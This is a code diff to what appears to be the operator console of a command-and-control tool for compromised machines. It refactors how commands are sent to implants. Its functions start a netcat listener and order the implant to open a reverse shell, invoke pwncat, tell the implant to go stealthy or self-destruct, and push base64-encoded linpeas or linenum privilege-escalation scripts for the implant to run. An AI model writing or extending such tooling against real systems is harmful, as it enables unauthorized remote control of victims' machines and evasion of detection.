@@ -1,5 +1,6 @@
 import errno
 import time
+from base64 import b64decode, b64encode
 
 from prompt_toolkit import PromptSession
 from prompt_toolkit.completion import NestedCompleter, DynamicCompleter
@@ -12,15 +13,17 @@ from threading import Lock
 from time import sleep
 from typing import Callable, Optional, Tuple
 
+import config
+from core.command import CommandRequest, CommandTypes
 from core.message import *
 
 from instance import Instance
 import instance_manager
-import my_logging
+from my_logging import Logger
 import web_server
 
 
-logger = my_logging.Logger('APP')
+logger = Logger('APP')
 
 
 def get_lambda(func: Callable, *args):
@@ -75,8 +78,9 @@ class App:
         }
         instance_commands = {
             'pwncat': self._do_pwncat,
-            'run_script': {
-                script: get_lambda(self._do_run_script, script) for script in map(lambda path: os.path.split(path)[-1], web_server.get_available_scripts())
+            'run': {
+                'linpeas': get_lambda(self._do_run_file, 'linpeas.sh'),
+                'linenum': get_lambda(self._do_run_file, 'linenum.sh'),
             },
             'self_destruct': self._do_self_destruct,
             'shell': self._do_open_shell_bash
@@ -136,22 +140,34 @@ class App:
         while time.perf_counter() - start < 3:
             sleep(0.1)
             if subprocess.call(f'netstat -lant | grep 0.0.0.0:{port}', shell=True, stdout=subprocess.DEVNULL) == 0:
-                self.selected_instance.messages_to_send.put(OpenReverseShellRequest(port))
+                message = Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.OPEN_SHELL, {"port": port}).to_json())
+                self.selected_instance.messages_to_send.put(message)
                 return
         else:
             logger.warn(f"pwncat didn't start within 3 secs :(")
 
     def _do_self_destruct(self):
-        self.selected_instance.messages_to_send.put(SelfDestructRequest())
+        message = Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.SELF_DESTRUCT).to_json())
+        self.selected_instance.messages_to_send.put(message)
 
     def _do_open_shell_bash(self):
         port = get_open_port()
         open_new_window_with_cmd(f'nc -lvp {port}', f'nc:{self.selected_instance.username}@{port}')
         sleep(0.1)  # just wait a tiny bit for nc to start
-        self.selected_instance.messages_to_send.put(OpenReverseShellRequest(port))
+        message = Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.OPEN_SHELL, {"port": port}).to_json())
+        self.selected_instance.messages_to_send.put(message)
 
     def _do_stealth(self):
-        self.selected_instance.messages_to_send.put(GoStealthyRequest())
+        self.selected_instance.messages_to_send.put(Message(MessageTypes.COMMAND_REQUEST, CommandRequest(CommandTypes.GO_STEALTHY).to_json()))
+
+    def _do_run_file(self, file_name: str):
+        with open(f'resources/{file_name}', 'rb') as fh:
+            contents = fh.read()
+        contents_b64 = b64encode(contents).decode()
+        command = CommandRequest(CommandTypes.RUN_FILE, {'contents_b64': contents_b64})
+        message = Message(MessageTypes.COMMAND_REQUEST, command.to_json())
+        config.run_file_commands_in_progress[command.uid] = file_name
+        self.selected_instance.messages_to_send.put(message)
 
     def _on_instances_update(self, instances: Tuple[Instance], new_or_deleted_instance: Optional[Instance] = None):
         if new_or_deleted_instance is not None:
